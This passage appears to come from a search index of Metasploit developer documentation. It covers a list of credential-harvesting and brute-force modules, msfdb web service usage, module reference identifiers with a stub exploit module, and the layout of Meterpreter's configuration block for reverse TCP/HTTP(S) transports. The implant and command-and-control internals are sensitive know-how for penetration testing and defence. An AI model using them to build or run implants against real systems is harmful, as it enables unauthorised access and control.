auxiliary/scanner/http/cisco_asa_asdm.rb auxiliary/scanner/http/cisco_ironport_enum.rb auxiliary/scanner/couchdb/couchdb_login.rb auxiliary/gather/d20pass.rb auxiliary/scanner/http/dell_idrac.rb auxiliary/scanner/http/dlink_dir_300_615_http_login.rb auxiliary/scanner/http/dlink_dir_615h_http_login.rb auxiliary/scanner/http/dlink_dir_session_cgi_http_login.rb auxiliary/scanner/http/dolibarr_login.rb auxiliary/gather/doliwamp_traversal_creds.rb auxiliary/server/capture/drda.rb auxiliary/scanner/http/drupal_views_user_enum.rb auxiliary/scanner/misc/dvr_config_disclosure.rb auxiliary/gather/eaton_nsm_creds.rb auxiliary/scanner/http/ektron_cms400net.rb post/osx/gather/enum_osx.rb post/windows/gather/enum_snmp.rb post/windows/gather/enum_tomcat.rb post/multi/gather/filezilla_client_cred.rb exploits/multi/http/glassfish_deployer.rb auxiliary/scanner/http/glassfish_login.rb auxiliary/gather/hp_snac_domain_creds.rb auxiliary/scanner/http/infovista_enum.rb auxiliary/scanner/ipmi/ipmi_dumphashes.rb auxiliary/scanner/oracle/isqlplus_login.rb auxiliary/scanner/oracle/isqlplus_sidbrute.rb exploits/linux/http/kloxo_sqli.rb auxiliary/scanner/scada/koyo_login.rb auxiliary/scanner/telnet/lantronix_telnet_password.rb auxiliary/scanner/lotus/lotus_domino_hashes.rb auxiliary/scanner/lotus/lotus_domino_login.rb auxiliary/scanner/mongodb/mongodb_login.rb post/linux/gather/mount_cifs_creds.rb auxiliary/scanner/msf/msf_rpc_login.rb auxiliary/scanner/msf/msf_web_login.rb auxiliary/scanner/nessus/nessus_ntp_login.rb auxiliary/scanner/nessus/nessus_xmlrpc_login.rb auxiliary/scanner/nexpose/nexpose_api_login.rb auxiliary/scanner/http/novell_mdm_creds.rb auxiliary/scanner/misc/oki_scanner.rb auxiliary/scanner/http/openmind_messageos_login.rb auxiliary/scanner/openvas/openvas_gsad_login.rb auxiliary/scanner/openvas/openvas_omp_login.rb auxiliary/scanner/openvas/openvas_otp_login.rb auxiliary/scanner/http/oracle_ilom_login.rb post/windows/gather/credentials/outlook.rb auxiliary/scanner/http/owa_login.rb auxiliary/scanner/pcanywhere/pcanywhere_login.rb post/multi/gather/pgpass_creds.rb auxiliary/scanner/postgres/postgres_version.rb post/linux/gather/pptpd_chap_secrets.rb auxiliary/scanner/http/radware_appdirector_enum.rb auxiliary/scanner/misc/raysharp_dvr_passwords.rb post/windows/gather/credentials/razer_synapse.rb post/windows/gather/credentials/razorsql.rb auxiliary/scanner/rservices/rexec_login.rb auxiliary/scanner/http/rfcode_reader_enum.rb auxiliary/scanner/rservices/rlogin_login.rb auxiliary/scanner/misc/rosewill_rxs3211_passwords.rb auxiliary/scanner/rservices/rsh_login.rb auxiliary/scanner/http/sap_businessobjects_user_brute.rb auxiliary/scanner/http/sap_businessobjects_user_brute_web.rb auxiliary/scanner/http/sap_businessobjects_user_enum.rb auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb auxiliary/scanner/sap/sap_mgmt_con_brute_login.rb auxiliary/scanner/sap/sap_soap_bapi_user_create1.rb auxiliary/scanner/sap/sap_soap_rfc_brute_login.rb auxiliary/scanner/sap/sap_web_gui_brute_login.rb auxiliary/scanner/http/sentry_cdu_enum.rb auxiliary/scanner/http/sevone_enum.rb auxiliary/scanner/oracle/sid_brute.rb auxiliary/admin/oracle/sid_brute.rb auxiliary/server/capture/sip.rb post/windows/gather/credentials/smartermail.rb post/windows/gather/credentials/spark_im.rb auxiliary/scanner/http/splunk_web_login.rb auxiliary/scanner/http/squiz_matrix_user_enum.rb auxiliary/scanner/ssh/ssh_identify_pubkeys.rb auxiliary/scanner/telnet/telnet_ruggedcom.rb auxiliary/scanner/http/titan_ftp_admin_pwd.rb auxiliary/scanner/http/tomcat_enum.rb post/windows/gather/credentials/tortoisesvn.rb post/windows/gather/credentials/total_commander.rb auxiliary/scanner/http/typo3_bruteforce.rb auxiliary/gather/vbulletin_vote_sqli.rb exploits/unix/webapp/vbulletin_vote_sqli_exec.rb auxiliary/scanner/http/vcms_login.rb auxiliary/scanner/vmware/vmware_http_login.rb auxiliary/scanner/dcerpc/windows_deployment_services.rb auxiliary/scanner/http/wordpress_login_enum.rb auxiliary/gather/wp_w3_total_cache_hash_extract.rb","title":"Modules to Refactor"},{"location":"dev/dark/Metasploit-Loginpalooza/#special-attention-needed","text":"[ ] post/windows/gather/enum_domain.rb - Partials, should create realms but not full cores [ ] post/windows/gather/enum_domain_group_users.rb - Should create realms and publics but won't be able to get privates [ ] post/windows/gather/enum_domains.rb - Creates realms [ ] post/windows/gather/enum_logged_on_users.rb - Creates publics but not privates","title":"Special attention needed"},{"location":"dev/dark/Metasploit-Web-Service/","text":"The Metasploit web service allows interaction with Metasploit's various data models through a REST API. Managing the Web Service Requirements To use the web service you will need a PostgreSQL database to serve as the backend data store. The msfdb tool allows you to manage both the Metasploit Framework database and web service. If you are going to configure the database manually you can find more information on the Managing the Database page. Getting Started Initialize the Database and Web Service Execute msfdb init and respond to prompts during the interactive initialization. The script first creates and configures the database, then it configures the web service, and finally configures the local msfconsole with the new data service connection. msfdb The msfdb tool allows you to manage both the Metasploit Framework database and web service components together or independently. If the --component option is not provided then the specified command will be executed for the database followed by the web service. This default mode of operation is useful when first setting up the database and web service. The component may be specified if you wish to make changes to a given component independent of the other. Usage: msfdb [options] <command> * Options: * Execute msfdb --help for the complete usage information * Commands: * init - initialize the component * reinit - delete and reinitialize the component * delete - delete and stop the component * status - check component status * start - start the component * stop - stop the component * restart - restart the component Examples msfdb start - Start the database and web service msfdb --component webservice stop - Stop the web service msfdb --component webservice --address 0.0.0.0 start - Start the web service, listening on any host address Notes SSL is enabled by default and msfdb will generate a fake \"snakeoil\" SSL certificate during initialization using Rex::Socket::Ssl.ssl_generate_certificate if one is not provided. The generated SSL certificate uses a random common name (CN) which will not match your hostname, therefore, you will need to make appropriate accommodations when operating the web service with such a certificate. Please generate your own SSL certificate and key instead and supply those to msfdb using the --ssl-cert-file and --ssl-key-file options, and enable SSL verification by passing the option --no-ssl-disable-verify . A simple verification that web service is up and running can be performed using cURL: curl --insecure -H \"Accept: application/json\" -H \"Authorization: Bearer <token>\" https://localhost:5443/api/v1/msf/version Accessing the API The API account can be accessed with your preferred web browser by visiting https://<address>:<port>/api/v1/auth/account . If you want to change the API token for your account you can log in to the API account page and generate a new API token. You can find more information on the data models and various API endpoints by visiting the API Documentation at: https://<address>:<port>/api/v1/api-docs Utilizing the Data Service in msfconsole Connecting You can use the db_connect command to connect to the desired data service. When you successfully connect to a data service that connection will be saved in the Metasploit config file. You can provide a name with the -n option, otherwise one will be randomly generated. You can then use that name to reconnect to the data service at a later time. Please note that you can only be connected to one data service at a time. The db_disconnect command will need to be used before switching to a new data service. You can use db_status to see information about the currently connected data service. Usage: db_connect <options> <url> * Options: * -l , --list-services - List the available data services that have been previously saved. * -y , --yaml - Connect to the data service specified in the provided database.yml file. * -n , --name - Name used to store the connection. Providing an existing name will overwrite the settings for that connection. * -c , --cert - Certificate file matching the remote data server's certificate. Needed when using self-signed SSL cert. * -t , --token - The API token used to authenticate to the remote data service. * --skip-verify - Skip validating authenticity of server's certificate (NOT RECOMMENDED). * Examples: * db_connect http://localhost:5443 - Connect to the Metasploit REST API instance at localhost running on port 5443 * db_connect -c ~/.msf4/msf-ws-cert.pem -t 72ce00fd9ab1a96970137e5a12faa12f38dcc4a9e42158bdd3ce7043c65f5ca37b862f3faf3630d2 https://localhost:5443 - Connect to the server running at localhost on port 5443 that has SSL and authentication enabled. * db_connect -l - List the data services that have been saved. * db_connect -n LA_server http://localhost:5443 - Connect to the data service running on localhost port 5443 and assign the name \"LA_server\" to the saved entry. * URL Formats * HTTP - http://<host>:<port> * HTTPS - https://<host>:<port> * Postgres - <user>:<password>@<host>:<port>/<database name> Setting a Default Data Service The db_save command can be used to save the currently connected data service as the default. Every time msfconsole starts up it will attempt to connect to that data service. You can always switch between data services if you have a default set, this will just determine which data service you are connected to when msfconsole is started. Usage: db_save * Examples: * db_connect http://localhost:5443 then db_save - Connect to the data service running on localhost port 5443 then set it as the default connection. Removing Saved Data Services Saved data services can be removed using the db_remove command. This can be useful if the data service no longer exists at that location, or if you no longer want to keep a record of it around for fast connection. Usage: db_remove <name> * Examples: * db_remove LA_server - Remove the saved data service entry called \"LA_server\" Notes There are a few pieces of information to keep in mind when using data services with Metasploit Framework. * Specifying the name of an existing saved data service connection will overwrite those settings. * A data service must already have an existing entry in the list of saved data services to be set as the default. Data services that were connected to using a database.yml file cannot be saved as default using this method. * A Postgres database connection is required before connecting to a remote data service. * The configuration from the database.yml will still be honored for the foreseeable future, but a saved default data service will take priority when it is present. * The saved data services are stored in the Metasploit config file, which is located at ~/.msf4/config by default.","title":"Metasploit Web Service"},{"location":"dev/dark/Metasploit-Web-Service/#managing-the-web-service","text":"","title":"Managing the Web Service"},{"location":"dev/dark/Metasploit-Web-Service/#requirements","text":"To use the web service you will need a PostgreSQL database to serve as the backend data store. The msfdb tool allows you to manage both the Metasploit Framework database and web service. If you are going to configure the database manually you can find more information on the Managing the Database page.","title":"Requirements"},{"location":"dev/dark/Metasploit-Web-Service/#getting-started","text":"","title":"Getting Started"},{"location":"dev/dark/Metasploit-Web-Service/#initialize-the-database-and-web-service","text":"Execute msfdb init and respond to prompts during the interactive initialization. The script first creates and configures the database, then it configures the web service, and finally configures the local msfconsole with the new data service connection.","title":"Initialize the Database and Web Service"},{"location":"dev/dark/Metasploit-Web-Service/#msfdb","text":"The msfdb tool allows you to manage both the Metasploit Framework database and web service components together or independently. If the --component option is not provided then the specified command will be executed for the database followed by the web service. This default mode of operation is useful when first setting up the database and web service. The component may be specified if you wish to make changes to a given component independent of the other. Usage: msfdb [options] <command> * Options: * Execute msfdb --help for the complete usage information * Commands: * init - initialize the component * reinit - delete and reinitialize the component * delete - delete and stop the component * status - check component status * start - start the component * stop - stop the component * restart - restart the component","title":"msfdb"},{"location":"dev/dark/Metasploit-Web-Service/#examples","text":"msfdb start - Start the database and web service msfdb --component webservice stop - Stop the web service msfdb --component webservice --address 0.0.0.0 start - Start the web service, listening on any host address","title":"Examples"},{"location":"dev/dark/Metasploit-Web-Service/#notes","text":"SSL is enabled by default and msfdb will generate a fake \"snakeoil\" SSL certificate during initialization using Rex::Socket::Ssl.ssl_generate_certificate if one is not provided. The generated SSL certificate uses a random common name (CN) which will not match your hostname, therefore, you will need to make appropriate accommodations when operating the web service with such a certificate. Please generate your own SSL certificate and key instead and supply those to msfdb using the --ssl-cert-file and --ssl-key-file options, and enable SSL verification by passing the option --no-ssl-disable-verify . A simple verification that web service is up and running can be performed using cURL: curl --insecure -H \"Accept: application/json\" -H \"Authorization: Bearer <token>\" https://localhost:5443/api/v1/msf/version","title":"Notes"},{"location":"dev/dark/Metasploit-Web-Service/#accessing-the-api","text":"The API account can be accessed with your preferred web browser by visiting https://<address>:<port>/api/v1/auth/account . If you want to change the API token for your account you can log in to the API account page and generate a new API token. You can find more information on the data models and various API endpoints by visiting the API Documentation at: https://<address>:<port>/api/v1/api-docs","title":"Accessing the API"},{"location":"dev/dark/Metasploit-Web-Service/#utilizing-the-data-service-in-msfconsole","text":"","title":"Utilizing the Data Service in msfconsole"},{"location":"dev/dark/Metasploit-Web-Service/#connecting","text":"You can use the db_connect command to connect to the desired data service. When you successfully connect to a data service that connection will be saved in the Metasploit config file. You can provide a name with the -n option, otherwise one will be randomly generated. You can then use that name to reconnect to the data service at a later time. Please note that you can only be connected to one data service at a time. The db_disconnect command will need to be used before switching to a new data service. You can use db_status to see information about the currently connected data service. Usage: db_connect <options> <url> * Options: * -l , --list-services - List the available data services that have been previously saved. * -y , --yaml - Connect to the data service specified in the provided database.yml file. * -n , --name - Name used to store the connection. Providing an existing name will overwrite the settings for that connection. * -c , --cert - Certificate file matching the remote data server's certificate. Needed when using self-signed SSL cert. * -t , --token - The API token used to authenticate to the remote data service. * --skip-verify - Skip validating authenticity of server's certificate (NOT RECOMMENDED). * Examples: * db_connect http://localhost:5443 - Connect to the Metasploit REST API instance at localhost running on port 5443 * db_connect -c ~/.msf4/msf-ws-cert.pem -t 72ce00fd9ab1a96970137e5a12faa12f38dcc4a9e42158bdd3ce7043c65f5ca37b862f3faf3630d2 https://localhost:5443 - Connect to the server running at localhost on port 5443 that has SSL and authentication enabled. * db_connect -l - List the data services that have been saved. * db_connect -n LA_server http://localhost:5443 - Connect to the data service running on localhost port 5443 and assign the name \"LA_server\" to the saved entry. * URL Formats * HTTP - http://<host>:<port> * HTTPS - https://<host>:<port> * Postgres - <user>:<password>@<host>:<port>/<database name>","title":"Connecting"},{"location":"dev/dark/Metasploit-Web-Service/#setting-a-default-data-service","text":"The db_save command can be used to save the currently connected data service as the default. Every time msfconsole starts up it will attempt to connect to that data service. You can always switch between data services if you have a default set, this will just determine which data service you are connected to when msfconsole is started. Usage: db_save * Examples: * db_connect http://localhost:5443 then db_save - Connect to the data service running on localhost port 5443 then set it as the default connection.","title":"Setting a Default Data Service"},{"location":"dev/dark/Metasploit-Web-Service/#removing-saved-data-services","text":"Saved data services can be removed using the db_remove command. This can be useful if the data service no longer exists at that location, or if you no longer want to keep a record of it around for fast connection. Usage: db_remove <name> * Examples: * db_remove LA_server - Remove the saved data service entry called \"LA_server\"","title":"Removing Saved Data Services"},{"location":"dev/dark/Metasploit-Web-Service/#notes_1","text":"There are a few pieces of information to keep in mind when using data services with Metasploit Framework. * Specifying the name of an existing saved data service connection will overwrite those settings. * A data service must already have an existing entry in the list of saved data services to be set as the default. Data services that were connected to using a database.yml file cannot be saved as default using this method. * A Postgres database connection is required before connecting to a remote data service. * The configuration from the database.yml will still be honored for the foreseeable future, but a saved default data service will take priority when it is present. * The saved data services are stored in the Metasploit config file, which is located at ~/.msf4/config by default.","title":"Notes"},{"location":"dev/dark/Metasploit-module-reference-identifiers/","text":"A reference in a Metasploit module is a source of information related to the module. This can be a link to the vulnerability advisory, a news article, a blog post about a specific technique the module uses, a specific tweet, etc. The more you have the better. However, you should not use this as a form of advertisement. List of supported reference identifiers ID Source Code Example CVE cvedetails.com ['CVE', '2014-9999'] CWE cwe.mitre.org ['CWE', '90'] BID securityfocus.com ['BID', '1234'] MSB technet.microsoft.com ['MSB', 'MS13-055'] EDB exploit-db.com ['EDB', '1337'] US-CERT-VU kb.cert.org ['US-CERT-VU', '800113'] ZDI zerodayinitiative.com ['ZDI', '10-123'] WPVDB wpvulndb.com ['WPVDB', '7615'] PACKETSTORM packetstormsecurity.com ['PACKETSTORM', '132721'] URL anything ['URL', 'http://example.com/blog.php?id=123'] AKA ( deprecated *) anything ['AKA', 'shellshock'] *Note: AKA names for modules are no longer stored as a reference identifier, but rather in the Notes metadata field as shown in the example below. Code Example of having references in a module require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking def initialize ( info = {}) super ( update_info ( info , 'Name' => \"Code Example\" , 'Description' => %q{ This is an example of a module using references } , 'License' => MSF_LICENSE , 'Author' => [ 'Unknown' ] , 'References' => [ [ 'CVE' , '2014-9999' ] , [ 'BID' , '1234' ] , [ 'URL' , 'http://example.com/blog.php?id=123' ] ] , 'Platform' => 'win' , 'Targets' => [ [ 'Example' , { 'Ret' => 0x41414141 } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'Privileged' => false , 'DisclosureDate' => \"Apr 1 2014\" , 'DefaultTarget' => 0 , 'Notes' => { 'AKA' => [ 'shellshock' ] } )) end def exploit print_debug ( 'Hello, world' ) end end","title":"Metasploit module reference identifiers"},{"location":"dev/dark/Metasploit-module-reference-identifiers/#list-of-supported-reference-identifiers","text":"ID Source Code Example CVE cvedetails.com ['CVE', '2014-9999'] CWE cwe.mitre.org ['CWE', '90'] BID securityfocus.com ['BID', '1234'] MSB technet.microsoft.com ['MSB', 'MS13-055'] EDB exploit-db.com ['EDB', '1337'] US-CERT-VU kb.cert.org ['US-CERT-VU', '800113'] ZDI zerodayinitiative.com ['ZDI', '10-123'] WPVDB wpvulndb.com ['WPVDB', '7615'] PACKETSTORM packetstormsecurity.com ['PACKETSTORM', '132721'] URL anything ['URL', 'http://example.com/blog.php?id=123'] AKA ( deprecated *) anything ['AKA', 'shellshock'] *Note: AKA names for modules are no longer stored as a reference identifier, but rather in the Notes metadata field as shown in the example below.","title":"List of supported reference identifiers"},{"location":"dev/dark/Metasploit-module-reference-identifiers/#code-example-of-having-references-in-a-module","text":"require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking def initialize ( info = {}) super ( update_info ( info , 'Name' => \"Code Example\" , 'Description' => %q{ This is an example of a module using references } , 'License' => MSF_LICENSE , 'Author' => [ 'Unknown' ] , 'References' => [ [ 'CVE' , '2014-9999' ] , [ 'BID' , '1234' ] , [ 'URL' , 'http://example.com/blog.php?id=123' ] ] , 'Platform' => 'win' , 'Targets' => [ [ 'Example' , { 'Ret' => 0x41414141 } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'Privileged' => false , 'DisclosureDate' => \"Apr 1 2014\" , 'DefaultTarget' => 0 , 'Notes' => { 'AKA' => [ 'shellshock' ] } )) end def exploit print_debug ( 'Hello, world' ) end end","title":"Code Example of having references in a module"},{"location":"dev/dark/Meterpreter-Configuration/","text":"Meterpreter has always had the need to be configured on the fly so that it knows how to talk to Metasploit. For many years, this configuration management was achieved by hot-patching a copy of the metsrv DLL/binary using a simple \"string replace\" approach. This worked well enough to support a number of situations, but restricted the flexibility of Meterpreter and its support for handling multiple transports. It wasn't just transports that were locked down, but the ability to provide payloads that contained way more than the core Meterpreter (metsrv) itself. It was also not easy to pass other forms of information on the fly to the Meterpreter instance because the stagers were only able to pass in a copy of the active socket handle. Recent modifications to Meterpreter have done away with this old method and have replaced with with a dynamic configuration block that can be used to alleviate these problems and provide the flexibility for other more interesting things down the track. This document contains information on the structure and layout of the new configuration block, along with how it is used by Meterpreter. How the configuration is found In the past Meterpreter has required that the stager (or stage0 as some like to call it) pass in a handle to the active socket so that it can take over communications without creating a new socket (at least in the case of TCP connections). While this feature is still required, it doesn't happen in the way that it used to. Instead, Meterpreter now requires that the stager pass in a pointer to the start of the configuration block. The configuration block can be anywhere in memory, so long as the memory region is marked as RWX . Loading configuration in Windows Meterpreter Stage 1 of loading Windows Meterpreter now utilises a new loader, called meterpreter_loader ( Win x86 , Win x64 ), which does the following: Loads the metsrv DLL from disk. Patches the DOS header of the DLL so that it contains executable shellcode that correctly initialises metsrv and calculates the location that points to the end of metsrv in memory. It also takes any existing socket value (found in edi or rdi depending on the architecture) and writes that directly to the configuration (more on this later). Generates a configuration block and appends this to the metsrv binary. The result is that the payload has the following structure once it has been prepared: \u2009\u2009+--------------+ \u2009\u2009| Patched DOS | \u2009\u2009| header | \u2009\u2009+--------------+ \u2009\u2009| | \u2009\u2009. . \u2009\u2009. metsrv dll . \u2009\u2009. . \u2009\u2009| | \u2009\u2009+--------------+ \u2009\u2009| config block | \u2009\u2009+--------------+ Loading configuration in POSIX Meterpreter POSIX Meterpreter functions in the same way, except that it doesn't have patched header that does the bootstrapping. The format of the payload is otherwise the same, and hence looks like this: \u2009\u2009+--------------+ \u2009\u2009| | \u2009\u2009. . \u2009\u2009. metsrv bin . \u2009\u2009. . \u2009\u2009| | \u2009\u2009+--------------+ \u2009\u2009| config block | \u2009\u2009+--------------+ TODO: confirm with @bcook-r7 that this is correct The structure of the configuration block is documented next. Configuration Block Structure In order to pass information to Meterpreter and not have it break, a known format of configuration is required. This format needs to be consistent on each invocation much like you would expect with any configuration. In the case of binary Meterpreter (POSIX and Windows), this configuration block contains the following: One Session configuration block. One or more Transport Configuration blocks, followed by a terminator. One or more Extension configuration blocks, followed by a terminator. Each of these blocks are described in detail in the sections below. Session configuration block The notion of a session configuration block is used to wrap up the following values: Socket handle - When Meterpreter is invoked with TCP communications, an active socket is already in use. This socket handle is intended to be reused by Meterpreter when metsrv executes. This socket handle is written to the configuration block on the fly by the loader. It is stored in the Session configuration block so that it has a known location. This value is always a 32-bit DWORD, even on 64-bit platforms. Exit func - This value is a 32-bit DWORD value that identifies the method that should be used when terminating the Meterpreter session. This value is the equivalent of the Block API Hash that represents the function to be invoked. Meterpreter used to delegate the responsibility of handling this to the stager that had invoked it. Meterpreter no longer does this, instead it handles the closing of the Meterpreter session by itself, and hence the chosen method for termination must be made known in the configuration. Session expiry value - This is a 32-bit DWORD that contains the number of seconds that the Meterpreter session should last for. While Meterpreter is running, this value is continually checked, and if the session expiry time is reached, then Meterpreter shuts itself down. For more information, please read the Timeout documentation (link coming soon). UUID - This is a 16-byte value that represents a payload UUID. A UUID is a new concept that has come to Metasploit with a goal of tracking payload type and origin, and validing that sessions received by Metasploit are intended for use by the current installation. For more information, please read the UUID documentation (link coming soon). The layout of this block in memory looks like this: \u2009\u2009+--------------+ \u2009\u2009|Socket\u2009Handle\u2009| \u2009\u2009+--------------+ \u2009\u2009| Exit func | \u2009\u2009+--------------+ \u2009\u2009|Session\u2009Expiry| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009 UUID\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ | <- 4 bytes ->| With this structure in place, Meterpreter knows that the session configuration block is exactly 28 bytes in size. The Session configuration block description can be found in the Meterpreter source . Transport configuration block The Transport configuration block is a term used to refer to the group of transport configurations that are present in the payload. Meterpreter now supports multiple transports, and so the configuration should support multiple transports too. There are two main issues when dealing with transport configurations: The configuration should allow for many transport configurations to be specified. The configuration should allow for each transport to be of a different type and size. Meterpreter's current transport implementations provide two main \"classes\" of transport, those being HTTP(S) and TCP . Each of these transport classes require different configuration values, as well as common values, in order to function. Common configuration values The values that are common to both HTTP(S) and TCP transports are: URL - This value is a meta-description of the transport and is used not only as a configuration element for the transport itself but also as a way of determining exactly what type of transport this block represents. The field is a total of 512 characters (Windows Meterpreter uses wchar_t , while POSIX Meterpreter uses char ). Transport types are specified by the scheme element in the URL, and the body of the URL specifies key information such as host and port information. Meterpreter inspects this to determine what type of transport block is in use, and hence from there is able to determine the size of the block. Valid values look like the following: tcp://<host>:<port> - indicates that this payload is a reverse IPv4 TCP connection. tcp6://<host>:<port>?<scope> - indicates that this payload is a reverse IPv6 TCP connection. tcp://:<port> - indicates that this payload is a bind payload listening on the specified port (note that no host is specifed). http://<host>:<port>/<uri> - indicates that this payload is an HTTP connection (can only be reverse ). https://<host>:<port>/<uri> - indicates that this payload is an HTTPS connection (can only be reverse ). Communications expiry - This value is another 32-bit DWORD value that represents the number of seconds to wait between successful packet/receive calls. For more information, please read the Timeout documentation (link coming soon). Retry total - This value is 32-bit DWORD value that represents the number of seconds that Meterpreter should continue to attempt to reconnect on this transport before giving up. For more information, please read the Timeout documentation (link coming soon). Retry wait - This value is 32-bit DWORD value that represents the number of seconds between each attempt that Meterpreter makes to reconnect on this transport. For more information, please read the Timeout documentation (link coming soon). The layout of this block in memory looks like the following: \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009 URL \u2009\u2009\u2009\u2009| \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 512 characters worth \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. (POSIX -> ASCII -> char) \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. (Windows -> wide char -> wchar_t) \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009| Comms T/O | \u2009\u2009+--------------+ \u2009\u2009| Retry Total | \u2009\u2009+--------------+ \u2009\u2009| Retry Wait | \u2009\u2009+--------------+ | <- 4 bytes ->| The common transport configuration block description can be found in the Meterpreter source . TCP configuration values At this time, there are no TCP -specific configuration values, as the common configuration block caters for all of the needs of TCP transports. This may change down the track. HTTP/S configuration values HTTP and HTTPS connections have a number of extra configuration values that are required in order to make it function correctly in various environments. Those values are: Proxy host - In environments where proxies are required to be set manually, this field contains the detail of the proxy to use. The field is 128 characters in size ( wchar_t only, given that we don't yet have HTTP/S transport in POSIX), and can be in one of the following formats: http://<proxy ip>:<proxy port> in the case of HTTP proxies. socks=<socks ip>:<sock port> in the case of socks proxies. Proxy user name - Some proxies require authentication. In such cases, this value contains the username that should be used to authenticate with the given proxy. This field is 64 characters in size ( wchar_t ). Proxy password - This value will accompany the user name field in the case where proxy authentication is required. It contains the password used to authenticate with the proxy, and is also 64 characters in size ( wchar_t ). User agent string - Customisable user agent string. This changes the user agent that is used when HTTP/S requests are made to Metasploit. This field is 256 characters in size ( wchar_t ). Expected SSL certificate hash - Meterpreter has the capability of validating the SSL certificate that Metasploit presents when using HTTPS . This value contains the 20 -byte SHA1 hash of the expected certificate. For more information, please read the SSL certificate validation documentation (link coming soon). All values that are shown above need to be specified in the configuration, including SSL certificate validation for plain HTTP connections. Values that are not used should be zeroed out. The structure of the HTTP/S configuration is as follows. \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy host | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 128 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy user | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 64 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009Proxy pass | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 64 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009User agent | \u2009\u2009.\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009. 256 characters worth (wchar_t) \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009 SSL cert | \u2009\u2009|\u2009\u2009 SHA1 hash | \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009|\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009\u2009| \u2009\u2009+--------------+ | <- 4 bytes ->| The HTTP/S transport configuration block description can be found in the Meterpreter source . Transport configuration list As already mentioned, more than one of these transport configuration blocks can be specified. In order to facilitate this, Meterpreter needs to know when the \"list\" of transports has ended. Using the URL , Meterpreter can determine the size of the block, and can move to the next block depending on the type that is discovered. As soon as Meterpreter detects a transport configuration URL value that has a string length of zero (ie. a single NULL ASCII char in POSIX and a single NULL multi-byte char in Windows) it assumes that the transport list has been terminated. The byte immediately following this is deemed to be the start of the Extension configuration, which is documented in the next section. Extension configuration block The extension configuration block is designed to allow Meterpreter payloads to contain any extra extensions that the user wants to bundle in. The goal is to provide the ability to have Stageless payloads (link coming soon), and to provide the means for sharing of extensions during migration (though this hasn't been implemented yet). Each of the extensions must have been compiled with Reflective DLL Injection support, as this is the mechanism that is used to load the extensions when Meterpreter starts. For more information on this facility, please see the Stageless payloads (link coming soon) documentation. The extension configuration block also functions as a \"list\" to allow for an arbitrary number of extensions to be included. Each extension entry needs to contain the following: Size - This is the exact size, in bytes, of the extension DLL itself. The value is a 32-bit DWORD. Extension binary - This is the full binary directly copied from the DLL. This value needs to be exactly the same length as what is specified in the Size field. When loading the extensions from the configuration, Meterpreter will continue to parse entries until it finds a size value of 0 . At this point Meterpreter assumes it has reached the end 